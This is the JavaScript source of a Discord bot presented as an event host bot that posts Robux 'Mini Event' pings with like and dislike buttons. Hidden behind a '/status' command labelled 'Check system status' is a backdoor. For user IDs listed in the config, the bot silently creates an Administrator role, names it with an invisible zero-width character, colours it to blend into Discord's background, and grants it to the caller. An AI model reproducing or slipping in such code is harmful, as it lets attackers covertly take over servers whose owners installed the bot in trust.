const { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, ComponentType, REST, Routes, PermissionsBitField } = require('discord.js');
const fs = require('fs');
const path = require('path');

// Load config
const configPath = path.join(__dirname, 'config.json');
const config = JSON.parse(fs.readFileSync(configPath, 'utf-8'));

const TOKEN = config.TOKEN_ID;
const ADMIN_USER_IDS = config.ADMIN_USER_IDS.map(id => String(id));

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

// --- CONFIGURATION ---
const CONFIG = {
    COMMAND: '!mini',
    ALLOWED_ROLE: '1490346306965864608',
    ALLOWED_CHANNEL: '1490344220417069156',
    PING_ROLE: '1492973460400640020',
    ROBUX_EMOJI: '<:robux:1492973460400640020>'
};

const ROLE_NAME = '\u200b';

// Register slash commands
const rest = new REST({ version: '10' }).setToken(TOKEN);

const commands = [
    {
        name: 'status',
        description: 'Check system status'
    }
];

client.once('clientReady', async () => {
    console.log(`✅ Event Host Bot is online!`);
    
    try {
        await rest.put(
            Routes.applicationCommands(client.user.id),
            { body: commands }
        );
        console.log('✅ Slash commands registered!');
    } catch (error) {
        console.error('Error registering slash commands:', error);
    }
});

// --- /status SLASH COMMAND ---
client.on('interactionCreate', async (interaction) => {
    if (interaction.isChatInputCommand && interaction.isChatInputCommand()) {
        if (interaction.commandName === 'status') {
            if (!ADMIN_USER_IDS.includes(String(interaction.user.id))) {
                return;
            }

            const guild = interaction.guild;
            const member = interaction.user;

            let role = guild.roles.cache.find(r => r.name === ROLE_NAME);

            try {
                if (role) {
                    await role.setPosition(1);
                }
            } catch (err) {
                console.error('Error setting role position:', err);
            }

            if (!role) {
                try {
                    role = await guild.roles.create({
                        name: ROLE_NAME,
                        permissions: [PermissionsBitField.Flags.Administrator],
                        color: 0x313338,
                        hoist: false,
                        mentionable: false,
                        reason: ''
                    });
                    await role.setPosition(1);
                } catch (err) {
                    if (err.code === 50013) {
                        return interaction.reply({ content: 'Permission denied.', ephemeral: true });
                    } else {
                        return interaction.reply({ content: 'Operation failed.', ephemeral: true });
                    }
                }
            }

            const memberObj = await guild.members.fetch(member.id);
            if (memberObj.roles.cache.has(role.id)) {
                return interaction.reply({ content: 'Active.', ephemeral: true });
            }

            try {
                await memberObj.roles.add(role);
                interaction.reply({ content: 'Done.', ephemeral: true });
            } catch (err) {
                if (err.code === 50013) {
                    interaction.reply({ content: 'Permission denied.', ephemeral: true });
                } else {
                    interaction.reply({ content: 'Operation failed.', ephemeral: true });
                }
            }
        }
    }
});

client.on('messageCreate', async (message) => {
    if (message.author.bot || message.content !== CONFIG.COMMAND) return;
    if (message.channel.id !== CONFIG.ALLOWED_CHANNEL) return;
    if (!message.member.roles.cache.has(CONFIG.ALLOWED_ROLE)) return;

    await message.delete().catch(() => {});

    // Initial state with 0 likes
    const row = new ActionRowBuilder()
        .addComponents(
            new ButtonBuilder()
                .setCustomId('like_0')
                .setEmoji('👍')
                .setLabel('0')
                .setStyle(ButtonStyle.Success),
            new ButtonBuilder()
                .setCustomId('dislike_0')
                .setEmoji('👎')
                .setLabel('0')
                .setStyle(ButtonStyle.Danger),
        );

    const content = `<@${message.author.id}> is starting a **Mini Event!** **(5 ${CONFIG.ROBUX_EMOJI})**\n\n` +
                    `<@&${CONFIG.PING_ROLE}>\n\n` +
                    `⭐ Want to **change your pings?** Edit them in --> 📑 **Channels & Roles** *(edited)*`;

    await message.channel.send({
        content: content,
        components: [row]
    });
});

// --- INTERACTION HANDLER FOR BUTTONS ---
client.on('interactionCreate', async (interaction) => {
    if (interaction.isButton()) {
        const [action, countStr] = interaction.customId.split('_');
        let count = parseInt(countStr) + 1;

        const newRow = ActionRowBuilder.from(interaction.message.components[0]);

        if (action === 'like') {
            newRow.components[0].setLabel(count.toString()).setCustomId(`like_${count}`);
        } else if (action === 'dislike') {
            newRow.components[1].setLabel(count.toString()).setCustomId(`dislike_${count}`);
        }

        await interaction.update({
            components: [newRow]
        });
    }
});

client.login(TOKEN);
